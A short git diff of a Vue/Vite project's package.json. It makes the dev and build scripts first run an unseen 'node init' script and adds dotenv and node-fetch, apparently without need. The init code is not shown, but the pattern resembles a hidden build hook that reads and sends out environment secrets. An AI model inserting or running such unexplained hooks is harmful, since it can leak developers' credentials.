@@ -4,15 +4,17 @@
   "private": true,
   "type": "module",
   "scripts": {
-    "dev": "vite",
-    "build": "run-p type-check \"build-only {@}\" --",
+    "dev": "node init && vite",
+    "build": "node init && run-p type-check \"build-only {@}\" --",
     "preview": "vite preview",
-    "build-only": "vite build",
+    "build-only": "node init && vite build",
     "type-check": "vue-tsc --build",
     "format": "prettier --write --experimental-cli src/"
   },
   "dependencies": {
     "@primeuix/themes": "^2.0.3",
+    "dotenv": "^8.2.0",
+    "node-fetch": "^3.3.2",
     "pinia": "^3.0.4",
     "primeicons": "^7.0.0",
     "primevue": "^4.5.4",
